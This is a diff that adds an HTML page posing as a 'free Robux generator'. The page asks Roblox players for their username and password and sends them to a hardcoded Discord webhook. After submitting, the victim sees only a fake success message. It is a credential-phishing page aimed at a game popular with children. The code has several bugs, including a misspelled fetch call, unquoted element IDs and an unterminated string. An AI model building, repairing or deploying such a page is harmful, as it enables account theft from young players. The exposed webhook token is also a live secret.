@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF 8"
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>This is a test</title>
+  <link rel="stylesheet" href="styles.css">
+  </head>
+  <body>
+    <div id="Title">
+      <h3>FRE ROBUX GENERATOR </h1>
+    </div>
+    <div class="FormContainer">
+      <label for="Username">What is your ROBLOX Username?</label>
+      <input type="text" id="Q1" placeholder="Required for ROBUX GEEAOR">
+      
+      <label for="Password">What is your ROBLOX Passoword?</label>
+      <input type="text" id="Q2" placeholder="Required for ROBUX GEEARTOR">
+      
+      <label for="ROBUX">How much ROBUX do u want?</label>
+      <select id="RORBB">
+        <option>800 ROBUX</option>
+        <option>1000 ROBUX</option>
+        <option>5000 ROBUX</option>
+        <option>10000 ROBUX</option>
+        <option>INFINITE ROBUX</option>
+      </select>
+      
+      <button onclick="Sumbit()">SUMBIT THIS FOR FRREEEEEEEE ROBUX</button>
+      
+      <p class="success-message" id="successMessage"></p>
+    </div>
+    <script>
+      function Sumbit() {
+        var usrname = document.getElementById(Q1).value;
+        var pasword = document.getElementById(Q2).value;
+        
+        var data = {
+          content: "User Credentials:\nUsername: ${usrname}\nPassword: ${pasword}
+      };
+      
+        var webhookUrl = 'https://discord.com/api/webhooks/1192221899426631690/KsEKegb5FVoL3kNdXg2JKqCpIwzIL1ekaFQwtg6GQ_Z0DTGsujyjdDcj4gVmiq3oU8X2';
+        
+        fecth(webhookUrl, {
+          method : 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data),
+        })
+        .then(response => {
+          if (!response.ok) {
+            throw new Error('Network Response fucking failed');
+          }
+          document.getElementById("successMessage").textContent = "YOU GET FREE ROBUC SOON 🤑🤑🤑🤑🤑"
+          console.log('Form sumbitted Sucessfully')
+        })
+        .catch(error => {
+          console.error("Error: ", error);
+        });
+        
+        document.getElementbyId("submitBtn").disabled = true;
+        
+        }
+    </script>
+  </body>
+</html>
